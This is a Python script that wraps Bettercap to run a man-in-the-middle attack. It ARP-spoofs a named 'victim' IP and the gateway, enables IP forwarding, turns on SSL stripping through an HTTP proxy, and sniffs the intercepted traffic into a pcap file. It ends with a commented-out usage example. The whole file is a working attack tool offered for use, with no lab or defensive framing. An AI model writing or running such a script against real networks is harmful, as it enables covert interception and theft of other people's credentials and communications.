import subprocess
import signal
import os
import atexit
import time

def mitm_sslstrip(target_ip: str, gateway_ip: str, iface: str = "eth0", pcap_output: str = "~/mitm_capture.pcap"):
    """
    Run a Bettercap MITM with SSL stripping and pcap capture.

    Args:
        target_ip:   Victim IP to ARP-spoof.
        gateway_ip:  Gateway IP to explicitly set for fullduplex spoofing.
        iface:       Network interface (eth0, wlan0, etc.)
        pcap_output: Path to save the captured pcap file.
    """
    pcap_path = os.path.expanduser(pcap_output)
    proc = None
    original_ip_forward = None

    # --- Save and enable IP forwarding ---
    result = subprocess.run(
        ["sysctl", "-n", "net.ipv4.ip_forward"],
        capture_output=True, text=True, check=True
    )
    original_ip_forward = result.stdout.strip()

    subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
    print(f"[+] IP forwarding enabled (was: {original_ip_forward})")

    # --- Build Bettercap commands (gateway_ip is now actually used) ---
    commands = f"""
set arp.spoof.targets {target_ip}
set arp.spoof.gateway {gateway_ip}
set arp.spoof.fullduplex true
arp.spoof on
set http.proxy.sslstrip true
http.proxy on
set net.sniff.verbose true
set net.sniff.output {pcap_path}
net.sniff on
session.idle.timeout 0
"""

    # --- Launch Bettercap (no pipe capture → no stall risk) ---
    proc = subprocess.Popen(
        ["sudo", "bettercap", "-iface", iface, "-eval", commands.strip()],
        stdout=None,       # inherit parent stdout (visible in terminal)
        stderr=None        # inherit parent stderr
    )

    print(f"[+] MITM running on {iface}")
    print(f"[+] Target:    {target_ip}")
    print(f"[+] Gateway:   {gateway_ip}")
    print(f"[+] SSL strip: enabled (note: HSTS-protected sites will NOT be stripped)")
    print(f"[+] PCAP:      {pcap_path}")
    print(f"[+] Press Ctrl+C to stop\n")

    try:
        proc.wait()
    except KeyboardInterrupt:
        print("\n[-] Stopping Bettercap...")
        proc.send_signal(signal.SIGINT)
        proc.wait()
    finally:
        # --- Guaranteed cleanup ---
        if proc and proc.poll() is None:
            proc.kill()
            proc.wait()

        # Restore original IP forwarding value
        subprocess.run(["sysctl", "-w", f"net.ipv4.ip_forward={original_ip_forward}"], check=True)
        print(f"[-] IP forwarding restored to: {original_ip_forward}")
        print(f"[-] PCAP saved to: {pcap_path}")

'''
# --- Usage ---
# if __name__ == "__main__":
#   mitm_sslstrip(
#        target_ip="192.168.1.10",
#        gateway_ip="192.168.1.1",
#        iface="eth0",
#        pcap_output="~/captures/mitm_1.pcap"
#    )   '''
